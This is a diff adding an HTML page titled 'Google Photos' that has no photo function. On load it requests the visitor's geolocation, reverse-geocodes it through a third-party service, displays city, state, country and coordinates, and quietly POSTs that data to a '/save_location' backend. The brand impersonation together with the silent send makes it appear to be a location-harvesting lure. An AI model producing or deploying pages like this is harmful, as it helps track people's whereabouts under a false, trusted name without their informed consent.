@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Google Photos</title>
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: linear-gradient(135deg, #4facfe, #00f2fe);
+      flex-direction: column;
+      color: #333;
+      text-align: center;
+    }
+
+    .card {
+      background: white;
+      border-radius: 20px;
+      padding: 30px;
+      width: 350px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+    }
+
+    h1 {
+      color: #0078ff;
+      margin-bottom: 15px;
+    }
+
+    .info {
+      margin-top: 10px;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #0078ff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #005fcc;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🌍 Your Current Location</h1>
+    <p id="loading">Detecting your location...</p>
+    <div id="info" class="info"></div>
+  </div>
+
+  <script>
+    const info = document.getElementById("info");
+    const loading = document.getElementById("loading");
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+      } else {
+        loading.innerText = "Geolocation is not supported by this browser.";
+      }
+    }
+
+    function showPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
+        .then(res => res.json())
+        .then(data => {
+          loading.style.display = "none";
+          const locationData = {
+            city: data.city || "Unknown",
+            state: data.principalSubdivision || "Unknown",
+            country: data.countryName || "Unknown",
+            latitude: lat,
+            longitude: lon
+          };
+
+          info.innerHTML = `
+            <p><strong>City:</strong> ${locationData.city}</p>
+            <p><strong>State:</strong> ${locationData.state}</p>
+            <p><strong>Country:</strong> ${locationData.country}</p>
+            <p><strong>Latitude:</strong> ${lat.toFixed(4)}</p>
+            <p><strong>Longitude:</strong> ${lon.toFixed(4)}</p>
+          `;
+
+          // Send to backend
+          fetch('/save_location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(locationData)
+          })
+          .then(res => res.json())
+          .then(res => console.log(res.message))
+          .catch(err => console.error("Error saving:", err));
+        });
+    }
+
+    function showError(error) {
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          loading.innerText = "Permission denied. Please allow location access.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          loading.innerText = "Location information unavailable.";
+          break;
+        case error.TIMEOUT:
+          loading.innerText = "Request timed out.";
+          break;
+        default:
+          loading.innerText = "An unknown error occurred.";
+      }
+    }
+
+    getLocation();
+  </script>
+</body>
+</html>
